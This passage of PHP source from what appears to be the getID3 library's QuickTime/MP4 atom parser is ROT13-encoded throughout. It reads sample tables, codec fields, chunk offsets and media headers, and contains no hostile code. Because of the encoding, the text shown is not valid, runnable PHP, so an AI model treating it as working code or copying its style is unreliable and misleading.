										//vs ((!rzcgl($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['jvqgu']) && !rzcgl($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['jvqgu'])) && (rzcgl($vasb['ivqrb']['erfbyhgvba_k']) || rzcgl($vasb['ivqrb']['erfbyhgvba_l']) || (ahzore_sbezng($vasb['ivqrb']['erfbyhgvba_k'], 6) != ahzore_sbezng(ebhaq($vasb['ivqrb']['erfbyhgvba_k']), 6)) || (ahzore_sbezng($vasb['ivqrb']['erfbyhgvba_l'], 6) != ahzore_sbezng(ebhaq($vasb['ivqrb']['erfbyhgvba_l']), 6)))) { // htyl purpx sbe sybngvat cbvag ahzoref
										vs (!rzcgl($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['jvqgu']) && !rzcgl($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['urvtug'])) {
											// nffhzr gung inyhrf fgberq urer ner zber vzcbegnag guna inyhrf fgberq va [gxuq] ngbz
											$vasb['ivqrb']['erfbyhgvba_k'] = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['jvqgu'];
											$vasb['ivqrb']['erfbyhgvba_l'] = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['urvtug'];
											$vasb['dhvpxgvzr']['ivqrb']['erfbyhgvba_k'] = $vasb['ivqrb']['erfbyhgvba_k'];
											$vasb['dhvpxgvzr']['ivqrb']['erfbyhgvba_l'] = $vasb['ivqrb']['erfbyhgvba_l'];
										}
										oernx;

									pnfr 'dgie':
										$vasb['ivqrb']['qngnsbezng'] = 'dhvpxgvzrie';
										oernx;

									pnfr 'zc4n':
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 20), $onfrbssfrg + $fgfqRagevrfQngnBssfrg - 20 - 16, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);

										$vasb['dhvpxgvzr']['nhqvb']['pbqrp']       = $guvf->DhvpxgvzrNhqvbPbqrpYbbxhc($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']);
										$vasb['dhvpxgvzr']['nhqvb']['fnzcyr_engr'] = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_fnzcyr_engr'];
										$vasb['dhvpxgvzr']['nhqvb']['punaaryf']    = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_punaaryf'];
										$vasb['dhvpxgvzr']['nhqvb']['ovg_qrcgu']   = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_ovg_qrcgu'];
										$vasb['nhqvb']['pbqrp']                    = $vasb['dhvpxgvzr']['nhqvb']['pbqrp'];
										$vasb['nhqvb']['fnzcyr_engr']              = $vasb['dhvpxgvzr']['nhqvb']['fnzcyr_engr'];
										$vasb['nhqvb']['punaaryf']                 = $vasb['dhvpxgvzr']['nhqvb']['punaaryf'];
										$vasb['nhqvb']['ovgf_cre_fnzcyr']          = $vasb['dhvpxgvzr']['nhqvb']['ovg_qrcgu'];
										fjvgpu ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']) {
											pnfr 'enj ': // CPZ
											pnfr 'nynp': // Nccyr Ybffyrff Nhqvb Pbqrp
											pnfr 'fbjg': // fvtarq/gjb'f pbzcyrzrag (Yvggyr Raqvna)
											pnfr 'gjbf': // fvtarq/gjb'f pbzcyrzrag (Ovt Raqvna)
											pnfr 'va24': // 24-ovg Vagrtre
											pnfr 'va32': // 32-ovg Vagrtre
											pnfr 'sy32': // 32-ovg Sybngvat Cbvag
											pnfr 'sy64': // 64-ovg Sybngvat Cbvag
												$vasb['nhqvb']['ybffyrff'] = $vasb['dhvpxgvzr']['nhqvb']['ybffyrff'] = gehr;
												$vasb['nhqvb']['ovgengr']  = $vasb['dhvpxgvzr']['nhqvb']['ovgengr']  = $vasb['nhqvb']['punaaryf'] * $vasb['nhqvb']['ovgf_cre_fnzcyr'] * $vasb['nhqvb']['fnzcyr_engr'];
												oernx;
											qrsnhyg:
												$vasb['nhqvb']['ybffyrff'] = snyfr;
												oernx;
										}
										oernx;

									qrsnhyg:
										oernx;
								}
								oernx;

							qrsnhyg:
								fjvgpu ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']) {
									pnfr 'zc4f':
										$vasb['svyrsbezng'] = 'zc4';
										oernx;

									qrsnhyg:
										// ivqrb ngbz
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_grzcbeny_dhnyvgl']  =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  8,  4));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_fcngvny_dhnyvgl']   =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 12,  4));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_senzr_jvqgu']       =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 16,  2));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_senzr_urvtug']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 18,  2));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_erfbyhgvba_k']      = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 20,  4));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_erfbyhgvba_l']      = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 24,  4));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_qngn_fvmr']         =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 28,  4));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_senzr_pbhag']       =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 32,  2));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_rapbqre_anzr_yra']  =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 34,  1));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_rapbqre_anzr']      =                             fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 35, $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_rapbqre_anzr_yra']);
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_qrcgu'] =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 66,  2));
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_pbybe_gnoyr_vq']    =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 68,  2));

										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_glcr']  = (((vag) $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_qrcgu'] > 32) ? 'tenlfpnyr' : 'pbybe');
										$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_anzr']  = $guvf->DhvpxgvzrPbybeAnzrYbbxhc($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_qrcgu']);

										vs ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_anzr'] != 'vainyvq') {
											$vasb['dhvpxgvzr']['ivqrb']['pbqrp_sbhepp']        = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng'];
											$vasb['dhvpxgvzr']['ivqrb']['pbqrp_sbhepp_ybbxhc'] = $guvf->DhvpxgvzrIvqrbPbqrpYbbxhc($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']);
											$vasb['dhvpxgvzr']['ivqrb']['pbqrp']               = (((vag) $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_rapbqre_anzr_yra'] > 0) ? $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_rapbqre_anzr'] : $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']);
											$vasb['dhvpxgvzr']['ivqrb']['pbybe_qrcgu']         = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_qrcgu'];
											$vasb['dhvpxgvzr']['ivqrb']['pbybe_qrcgu_anzr']    = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ivqrb_cvkry_pbybe_anzr'];

											$vasb['ivqrb']['pbqrp']           = $vasb['dhvpxgvzr']['ivqrb']['pbqrp'];
											$vasb['ivqrb']['ovgf_cre_fnzcyr'] = $vasb['dhvpxgvzr']['ivqrb']['pbybe_qrcgu'];
										}
										$vasb['ivqrb']['ybffyrff']           = snyfr;
										$vasb['ivqrb']['cvkry_nfcrpg_engvb'] = (sybng) 1;
										oernx;
								}
								oernx;
						}
						fjvgpu (fgegbybjre($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng'])) {
							pnfr 'zc4n':
								$vasb['nhqvb']['qngnsbezng']         = 'zc4';
								$vasb['dhvpxgvzr']['nhqvb']['pbqrp'] = 'zc4';
								oernx;

							pnfr '3vik':
							pnfr '3vi1':
							pnfr '3vi2':
								$vasb['ivqrb']['qngnsbezng'] = '3vik';
								oernx;

							pnfr 'kivq':
								$vasb['ivqrb']['qngnsbezng'] = 'kivq';
								oernx;

							pnfr 'zc4i':
								$vasb['ivqrb']['qngnsbezng'] = 'zcrt4';
								oernx;

							pnfr 'qvik':
							pnfr 'qvi1':
							pnfr 'qvi2':
							pnfr 'qvi3':
							pnfr 'qvi4':
							pnfr 'qvi5':
							pnfr 'qvi6':
								$vasb['ivqrb']['qngnsbezng'] = 'qvik';
								oernx;

							qrsnhyg:
								// qb abguvat
								oernx;
						}
						hafrg($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn']);
					}
					oernx;


				pnfr 'fggf': // Fnzcyr Gnoyr Gvzr-gb-Fnzcyr ngbz
					$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$fggfRagevrfQngnBssfrg = 8;
					//$SenzrEngrPnyphyngbeNeenl = neenl();
					$senzrf_pbhag = 0;

					$znk_fggf_ragevrf_gb_fpna = ($vasb['cuc_zrzbel_yvzvg'] ? zva(sybbe($guvf->trgvq3->zrzbel_yvzvg / 10000), $ngbz_fgehpgher['ahzore_ragevrf']) : $ngbz_fgehpgher['ahzore_ragevrf']);
					vs ($znk_fggf_ragevrf_gb_fpna < $ngbz_fgehpgher['ahzore_ragevrf']) {
						$guvf->jneavat('DhvpxGvzr ngbz \"fggf\" unf '.$ngbz_fgehpgher['ahzore_ragevrf'].' ohg bayl fpnaavat gur svefg '.$znk_fggf_ragevrf_gb_fpna.' ragevrf qhr gb yvzvgrq CUC zrzbel ninvynoyr ('.sybbe($guvf->trgvq3->zrzbel_yvzvg / 1048576).'ZO).');
					}
					sbe ($v = 0; $v < $znk_fggf_ragevrf_gb_fpna; $v++) {
						$ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_pbhag']    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fggfRagevrfQngnBssfrg, 4));
						$fggfRagevrfQngnBssfrg += 4;
						$ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_qhengvba'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fggfRagevrfQngnBssfrg, 4));
						$fggfRagevrfQngnBssfrg += 4;

						$senzrf_pbhag += $ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_pbhag'];

						// GUVF FRPGVBA ERCYNPRQ JVGU PBQR VA \"fgoy\" NGBZ
						//vs (!rzcgl($vasb['dhvpxgvzr']['gvzr_fpnyr']) && ($ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_qhengvba'] > 0)) {
						//	$fggf_arj_senzrengr = $vasb['dhvpxgvzr']['gvzr_fpnyr'] / $ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_qhengvba'];
						//	vs ($fggf_arj_senzrengr <= 60) {
						//		// fbzr ngbzf unir qhengvbaf bs \"1\" tvivat n irel ynetr senzrengr, juvpu cebonoyl vf abg evtug
						//		$vasb['ivqrb']['senzr_engr'] = znk($vasb['ivqrb']['senzr_engr'], $fggf_arj_senzrengr);
						//	}
						//}
						//
						//$SenzrEngrPnyphyngbeNeenl[($vasb['dhvpxgvzr']['gvzr_fpnyr'] / $ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_qhengvba'])] += $ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v]['fnzcyr_pbhag'];
					}
					$vasb['dhvpxgvzr']['fggf_senzrpbhag'][] = $senzrf_pbhag;
					//$fggfSenzrfGbgny  = 0;
					//$fggfFrpbaqfGbgny = 0;
					//sbernpu ($SenzrEngrPnyphyngbeNeenl nf $senzrf_cre_frpbaq => $senzr_pbhag) {
					//	vs (($senzrf_cre_frpbaq > 60) || ($senzrf_cre_frpbaq < 1)) {
					//		// abg ivqrb SCF vasbezngvba, cebonoyl nhqvb vasbezngvba
					//		$fggfSenzrfGbgny  = 0;
					//		$fggfFrpbaqfGbgny = 0;
					//		oernx;
					//	}
					//	$fggfSenzrfGbgny  += $senzr_pbhag;
					//	$fggfFrpbaqfGbgny += $senzr_pbhag / $senzrf_cre_frpbaq;
					//}
					//vs (($fggfSenzrfGbgny > 0) && ($fggfFrpbaqfGbgny > 0)) {
					//	vs (($fggfSenzrfGbgny / $fggfFrpbaqfGbgny) > $vasb['ivqrb']['senzr_engr']) {
					//		$vasb['ivqrb']['senzr_engr'] = $fggfSenzrfGbgny / $fggfFrpbaqfGbgny;
					//	}
					//}
					oernx;


				pnfr 'fgff': // Fnzcyr Gnoyr Flap Fnzcyr (xrl senzrf) ngbz
					vs ($CnefrNyyCbffvoyrNgbzf) {
						$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
						$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
						$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
						$fgffRagevrfQngnBssfrg = 8;
						sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
							$ngbz_fgehpgher['gvzr_gb_fnzcyr_gnoyr'][$v] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgffRagevrfQngnBssfrg, 4));
							$fgffRagevrfQngnBssfrg += 4;
						}
					}
					oernx;


				pnfr 'fgfp': // Fnzcyr Gnoyr Fnzcyr-gb-Puhax ngbz
					vs ($CnefrNyyCbffvoyrNgbzf) {
						$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
						$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
						$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
						$fgfpRagevrfQngnBssfrg = 8;
						sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
							$ngbz_fgehpgher['fnzcyr_gb_puhax_gnoyr'][$v]['svefg_puhax']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfpRagevrfQngnBssfrg, 4));
							$fgfpRagevrfQngnBssfrg += 4;
							$ngbz_fgehpgher['fnzcyr_gb_puhax_gnoyr'][$v]['fnzcyrf_cre_puhax']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfpRagevrfQngnBssfrg, 4));
							$fgfpRagevrfQngnBssfrg += 4;
							$ngbz_fgehpgher['fnzcyr_gb_puhax_gnoyr'][$v]['fnzcyr_qrfpevcgvba'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfpRagevrfQngnBssfrg, 4));
							$fgfpRagevrfQngnBssfrg += 4;
						}
					}
					oernx;


				pnfr 'fgfm': // Fnzcyr Gnoyr FvMr ngbz
					vs ($CnefrNyyCbffvoyrNgbzf) {
						$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
						$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
						$ngbz_fgehpgher['fnzcyr_fvmr']    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
						$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
						$fgfmRagevrfQngnBssfrg = 12;
						vs ($ngbz_fgehpgher['fnzcyr_fvmr'] == 0) {
							sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
								$ngbz_fgehpgher['fnzcyr_fvmr_gnoyr'][$v] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfmRagevrfQngnBssfrg, 4));
								$fgfmRagevrfQngnBssfrg += 4;
							}
						}
					}
					oernx;


				pnfr 'fgpb': // Fnzcyr Gnoyr Puhax Bssfrg ngbz
//					vs (gehr) {
					vs ($CnefrNyyCbffvoyrNgbzf) {
						$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
						$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
						$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
						$fgpbRagevrfQngnBssfrg = 8;
						sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
							$ngbz_fgehpgher['puhax_bssfrg_gnoyr'][$v] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgpbRagevrfQngnBssfrg, 4));
							$fgpbRagevrfQngnBssfrg += 4;
						}
					}
					oernx;


				pnfr 'pb64': // Puhax Bssfrg 64-ovg (irefvba bs \"fgpb\" gung fhccbegf > 2TO svyrf)
					vs ($CnefrNyyCbffvoyrNgbzf) {
						$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
						$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
						$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
						$fgpbRagevrfQngnBssfrg = 8;
						sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
							$ngbz_fgehpgher['puhax_bssfrg_gnoyr'][$v] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgpbRagevrfQngnBssfrg, 8));
							$fgpbRagevrfQngnBssfrg += 8;
						}
					}
					oernx;


				pnfr 'qers': // Qngn ERSrerapr ngbz
					$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$qersQngnBssfrg = 8;
					sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
						$ngbz_fgehpgher['qngn_ersreraprf'][$v]['fvmr']                    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $qersQngnBssfrg, 4));
						$qersQngnBssfrg += 4;
						$ngbz_fgehpgher['qngn_ersreraprf'][$v]['glcr']                    =                           fhofge($ngbz_qngn, $qersQngnBssfrg, 4);
						$qersQngnBssfrg += 4;
						$ngbz_fgehpgher['qngn_ersreraprf'][$v]['irefvba']                 = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  $qersQngnBssfrg, 1));
						$qersQngnBssfrg += 1;
						$ngbz_fgehpgher['qngn_ersreraprf'][$v]['syntf_enj']               = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  $qersQngnBssfrg, 3)); // uneqpbqrq: 0k0000
						$qersQngnBssfrg += 3;
						$ngbz_fgehpgher['qngn_ersreraprf'][$v]['qngn']                    =                           fhofge($ngbz_qngn, $qersQngnBssfrg, ($ngbz_fgehpgher['qngn_ersreraprf'][$v]['fvmr'] - 4 - 4 - 1 - 3));
						$qersQngnBssfrg += ($ngbz_fgehpgher['qngn_ersreraprf'][$v]['fvmr'] - 4 - 4 - 1 - 3);

						$ngbz_fgehpgher['qngn_ersreraprf'][$v]['syntf']['frys_ersrerapr'] = (obby) ($ngbz_fgehpgher['qngn_ersreraprf'][$v]['syntf_enj'] & 0k001);
					}
					oernx;


				pnfr 'tzva': // onfr Zrqvn VAsbezngvba ngbz
					$ngbz_fgehpgher['irefvba']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['tencuvpf_zbqr']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2));
					$ngbz_fgehpgher['bcpbybe_erq']            = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  6, 2));
					$ngbz_fgehpgher['bcpbybe_terra']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 2));
					$ngbz_fgehpgher['bcpbybe_oyhr']           = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 10, 2));
					$ngbz_fgehpgher['onynapr']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 12, 2));
					$ngbz_fgehpgher['erfreirq']               = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 14, 2));
					oernx;


				pnfr 'fzuq': // Fbhaq Zrqvn vasbezngvba UrnQre ngbz
					$ngbz_fgehpgher['irefvba']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['onynapr']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2));
					$ngbz_fgehpgher['erfreirq']               = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  6, 2));
					oernx;


				pnfr 'izuq': // Ivqrb Zrqvn vasbezngvba UrnQre ngbz
					$ngbz_fgehpgher['irefvba']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3));
					$ngbz_fgehpgher['tencuvpf_zbqr']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2));
					$ngbz_fgehpgher['bcpbybe_erq']            = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  6, 2));
					$ngbz_fgehpgher['bcpbybe_terra']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 2));
					$ngbz_fgehpgher['bcpbybe_oyhr']           = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 10, 2));

					$ngbz_fgehpgher['syntf']['ab_yrna_nurnq'] = (obby) ($ngbz_fgehpgher['syntf_enj'] & 0k001);
					oernx;


				pnfr 'uqye': // UnaQYrE ersrerapr ngbz
					$ngbz_fgehpgher['irefvba']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['pbzcbarag_glcr']         =                           fhofge($ngbz_qngn,  4, 4);
					$ngbz_fgehpgher['pbzcbarag_fhoglcr']      =                           fhofge($ngbz_qngn,  8, 4);
					$ngbz_fgehpgher['pbzcbarag_znahsnpghere'] =                           fhofge($ngbz_qngn, 12, 4);
					$ngbz_fgehpgher['pbzcbarag_syntf_enj']    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 16, 4));
					$ngbz_fgehpgher['pbzcbarag_syntf_znfx']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 20, 4));
					$ngbz_fgehpgher['pbzcbarag_anzr']         = $guvf->ZnlorCnfpny2Fgevat(fhofge($ngbz_qngn, 24));

					vs (($ngbz_fgehpgher['pbzcbarag_fhoglcr'] == 'FGca') && ($ngbz_fgehpgher['pbzcbarag_znahsnpghere'] == 'mmmm')) {
						$vasb['ivqrb']['qngnsbezng'] = 'dhvpxgvzrie';
					}
					oernx;


				pnfr 'zquq': // ZrQvn UrnQre ngbz
					$ngbz_fgehpgher['irefvba']               = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['perngvba_gvzr']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$ngbz_fgehpgher['zbqvsl_gvzr']           = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
					$ngbz_fgehpgher['gvzr_fpnyr']            = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 12, 4));
					$ngbz_fgehpgher['qhengvba']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 16, 4));
					$ngbz_fgehpgher['ynathntr_vq']           = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 20, 2));
					$ngbz_fgehpgher['dhnyvgl']               = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 22, 2));

					vs ($ngbz_fgehpgher['gvzr_fpnyr'] == 0) {
						$guvf->reebe('Pbeehcg Dhvpxgvzr svyr: zquq.gvzr_fpnyr == mreb');
						erghea snyfr;
					}
